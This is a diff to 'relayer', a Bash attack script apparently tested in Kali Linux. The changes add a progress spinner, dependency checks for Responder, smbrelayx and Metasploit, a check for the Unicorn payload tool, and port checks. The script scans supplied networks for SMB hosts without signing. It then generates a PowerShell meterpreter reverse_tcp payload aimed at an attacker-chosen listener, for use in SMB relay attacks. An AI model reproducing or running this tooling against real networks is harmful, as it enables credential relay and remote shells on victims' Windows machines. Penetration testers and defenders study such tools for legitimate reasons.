@@ -8,6 +8,7 @@
 # Twitter = @JsiTech
 
 # Tool URL = github.com/jsitech/relayer
+# Tested in Kali Linux
 
 # Based from chuckle
 # Credits to nccgroup
@@ -42,15 +43,68 @@ echo
 
 }
 
+################################################################################
+
+spinner ()
+{
+    bar=" ++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
+    barlength=${#bar}
+    i=0
+    while ((i < 100)); do
+        n=$((i*barlength / 100))
+        printf "\e[00;34m\r[%-${barlength}s]\e[00m" "${bar:0:n}"
+        ((i += RANDOM%5+2))
+        sleep 0.05
+    done
+}
+
+################################################################################
+clear
+f_banner
+
+echo "Checking for dependencies"
+spinner
+clear
+
+f_banner
+for dependency in responder nmap smbrelayx.py msfconsole; do
+  if [ `which $dependency 2>&1 | wc -l` -eq 0 ]; then
+    echo "Missing Dependency $dependency, Please run install_req.sh before running relayer"
+    missing=1
+  fi
+done
+
+if [ "$missing" == 1 ]; then
+   exit
+fi
+
+echo "Checking if Unicorn from TrustedSec is Present"
+
+if [ -d unicorn/ ]; then
+  echo ""
+  echo "Unicorn Dir is Present, Moving on"
+else
+  echo ""
+  echo "Unicorn is not Present, Please run install_req.sh"
+  exit
+fi
+
+
+echo "Checking if Needed ports are Available"
+spinner
 clear
 f_banner
 
 for port in 21/tcp 25/tcp 53/tcp 80/tcp 110/tcp 139/tcp 1433/tcp 443/tcp 587/tcp 389/tcp 445/tcp 3141/tcp 53/udp 137/udp 138/udp 5553/udp; do
   if [ `fuser $port 2>&1 |wc -l` -gt 0 ]; then
     echo "port $port busy, please check"
-    exit 0
+    busy=1
   fi
 done
+
+if [ "$busy" == 1 ]; then
+    exit
+fi
 
 echo "Please enter IP(s) or Network(s) separated by space to scan for SMB:" ; read network
 for subnet in $network; do
@@ -59,8 +113,6 @@ done >> relayersubnet.txt
 nmap -n -Pn -iL relayersubnet.txt -sS --script smb-security-mode.nse -p445 -oA relayer >>relayer.log &
 echo "Scanning for SMB hosts and NETBIOS name...It may take a little while"
 wait
-
-rm relayersubnet.txt
 
 for ip in $(grep open relayer.gnmap |cut -d ' ' -f 2 ); do
   hosts=$(grep -A 15 "for $ip$" relayer.nmap |grep disabled |wc -l)
@@ -85,6 +137,8 @@ else
 	exit
 fi
 
+clear
+f_banner
 echo "What System do you want the Metasploit Listener to run on? Select 1 or 2 and press ENTER"
 echo ""
 echo -e "1. Use my current local ip address"
@@ -111,6 +165,7 @@ elif [ "$select" = "2" ]; then
 fi
 
 echo "Generating Payload..."
+spinner
 python unicorn/unicorn.py windows/meterpreter/reverse_tcp $lhost $lport 2>&1
 payload=$(cat powershell_attack.txt)
 echo "Payload created"
@@ -157,3 +212,4 @@ fi
 
 rm relayer.hosts
 rm relayer.ifaces
+rm relayersubnet.txt
